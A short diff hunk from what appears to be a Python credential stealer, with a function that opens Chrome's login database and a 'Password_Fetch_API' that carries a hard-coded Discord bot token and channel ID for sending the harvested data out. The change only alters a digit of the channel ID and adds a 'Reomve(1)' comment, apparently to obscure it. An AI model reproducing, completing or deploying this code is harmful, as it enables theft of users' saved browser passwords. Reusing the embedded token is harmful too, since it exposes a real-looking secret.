@@ -62,7 +62,7 @@ def get_db_connection(chrome_path_login_db):
     
 def Password_Fetch_API(File):
     TOKEN = 'MTIwNjg4OTgzMTk4OTUxMDIxNQ.GmYgry.fHzlPDU5h3DMpDqfZg8A5p5X3pb6mbugjf00cY'
-    CHANNEL_ID = 1206955833410330635  #
+    CHANNEL_ID = 120695583341033063#Reomve(1)5 
     intents = discord.Intents.default()
     intents.messages = True
     intents.guilds = True
